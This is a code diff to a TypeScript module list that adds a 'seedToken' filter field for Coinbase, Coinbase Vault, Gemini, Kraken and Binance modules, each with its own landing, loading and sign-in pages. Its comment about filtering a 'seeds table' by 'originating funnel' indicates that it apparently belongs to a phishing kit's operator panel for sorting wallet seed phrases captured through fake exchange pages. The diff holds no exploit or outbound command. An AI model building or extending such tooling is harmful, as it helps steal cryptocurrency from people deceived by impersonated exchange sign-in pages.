@@ -3,6 +3,13 @@ export interface ModuleDefinition {
 	label: string;
 	icon: string;
 	color: string;
+	/**
+	 * Lowercase substring used when filtering the seeds table by module.
+	 * Seed rows store the originating funnel in a `flow` column whose values
+	 * use snake_case tokens like `coinbase_vault` — this token is the
+	 * substring we match against (case-insensitive LIKE).
+	 */
+	seedToken: string;
 	landingPages: { value: string; label: string }[];
 	signinPages: { value: string; label: string }[];
 }
@@ -60,6 +67,7 @@ export const MODULES: ModuleDefinition[] = [
 		label: 'Coinbase',
 		icon: '/images/coinbase.png',
 		color: 'blue',
+		seedToken: 'coinbase',
 		landingPages: COINBASE_LANDING,
 		signinPages: COINBASE_SIGNIN
 	},
@@ -68,6 +76,7 @@ export const MODULES: ModuleDefinition[] = [
 		label: 'Coinbase Vault',
 		icon: '/images/coinbase.png',
 		color: 'purple',
+		seedToken: 'vault',
 		landingPages: [
 			{ value: '/vault/setup', label: 'Vault Setup' },
 			{ value: '/vault/dashboard', label: 'Vault Dashboard' },
@@ -80,6 +89,7 @@ export const MODULES: ModuleDefinition[] = [
 		label: 'Gemini',
 		icon: '/images/gemini.png',
 		color: 'cyan',
+		seedToken: 'gemini',
 		landingPages: [
 			{ value: '/loading', label: 'Loading Page' },
 			{ value: '/signin', label: 'Sign In' }
@@ -91,6 +101,7 @@ export const MODULES: ModuleDefinition[] = [
 		label: 'Kraken',
 		icon: '/images/kraken.png',
 		color: 'violet',
+		seedToken: 'kraken',
 		landingPages: [
 			{ value: '/loading', label: 'Loading Page' },
 			{ value: '/signin', label: 'Sign In' }
@@ -102,6 +113,7 @@ export const MODULES: ModuleDefinition[] = [
 		label: 'Binance',
 		icon: '/images/binance.png',
 		color: 'amber',
+		seedToken: 'binance',
 		landingPages: [
 			{ value: '/loading', label: 'Loading Page' },
 			{ value: '/signin', label: 'Sign In' }
